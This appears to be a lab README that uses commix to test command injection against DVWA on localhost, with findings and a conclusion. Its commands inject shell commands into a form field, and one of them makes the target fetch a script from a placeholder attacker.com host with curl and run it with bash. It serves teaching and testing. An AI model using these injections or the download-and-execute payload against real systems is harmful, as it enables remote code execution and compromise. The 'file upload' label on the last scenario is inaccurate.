# Command Injection Exploitation with Commix

This README documents the process of identifying and exploiting command injection vulnerabilities using Commix on the DVWA (Damn Vulnerable Web Application) platform. The scenarios cover various methods of command injection and demonstrate how an attacker might leverage these vulnerabilities.

## Test Scenarios

### 1. Basic Command Injection Test

**Description:**

In this scenario, we input a basic system command (`; ls -a`) into an input field that is expected to be sanitized. This test checks whether the application correctly handles and sanitizes the input, preventing the execution of arbitrary commands.

**Command:**

```bash
commix --url="http://127.0.0.1/DVWA/vulnerabilities/exec/" --cookie="security=low; PHPSESSID=2d78533a6olcnhe3bhoaam0ev5" --data="ip=127.0.0.1;ls+-a&Submit=Submit"
```

**Expected Result:**

The system should handle the input safely without executing the injected commands.

---

### 2. Advanced Command Injection with Chaining

**Description:**

This scenario demonstrates the chaining of multiple commands using `&&` or `;` to escalate privileges or access system information. It is used to test if the input field allows the execution of multiple commands in sequence.

**Command:**

```bash
commix --url="http://127.0.0.1/DVWA/vulnerabilities/exec/" --cookie="security=low; PHPSESSID=2d78533a6olcnhe3bhoaam0ev5" --data="ip=127.0.0.1;id&&whoami&Submit=Submit"
```

**Expected Result:**

The system should not allow the execution of chained commands, even if the first command appears harmless.

### 3. Command Injection with Obfuscation

**Description:**

In this scenario, we use encoded or obfuscated commands (e.g., using URL encoding) to bypass simple validation mechanisms that might otherwise block command injection attempts.

**Command:**

```bash
commix --url="http://127.0.0.1/DVWA/vulnerabilities/exec/" --cookie="security=low; PHPSESSID=2d78533a6olcnhe3bhoaam0ev5" --data="ip=127.0.0.1;%3Bid&Submit=Submit"
```

**Expected Result:**

The system should correctly validate and sanitize inputs, preventing the execution of obfuscated or encoded commands.

### 4. Command Injection via File Upload

**Description:**

This scenario involves attempting to upload files with names or contents that are executable commands. The goal is to see if the system correctly identifies and blocks malicious file uploads.

**Command:**

```bash
commix --url="http://127.0.0.1/DVWA/vulnerabilities/exec/" --cookie="security=low; PHPSESSID=2d78533a6olcnhe3bhoaam0ev5" --data="ip=127.0.0.1;curl+http://attacker.com/shell.sh+-o+/tmp/shell.sh&&bash+/tmp/shell.sh&Submit=Submit"
```

**Expected Result:**
The system should detect and block malicious file uploads, especially those containing executable content or suspicious filenames.

## Test Results:

During the tests, Commix was able to detect and exploit command injection vulnerabilities in the DVWA platform. The successful execution of commands such as whoami confirmed that the input fields were vulnerable, allowing for arbitrary command execution on the underlying system.

**Key Findings:**
Basic Command Injection: Successfully executed the ls -a command, listing the contents of the current directory.
Advanced Command Injection with Chaining: Successfully chained commands to retrieve the current user information.
Obfuscated Command Injection: Successfully bypassed simple input validation mechanisms using URL-encoded commands.
File Upload Command Injection: Demonstrated the potential to upload and execute a shell script on the target system.

## Conclusion:

These tests highlight the critical importance of proper input validation and sanitization in web applications. Command injection vulnerabilities can lead to complete system compromise, especially when attackers can chain commands, obfuscate inputs, or exploit file upload mechanisms.
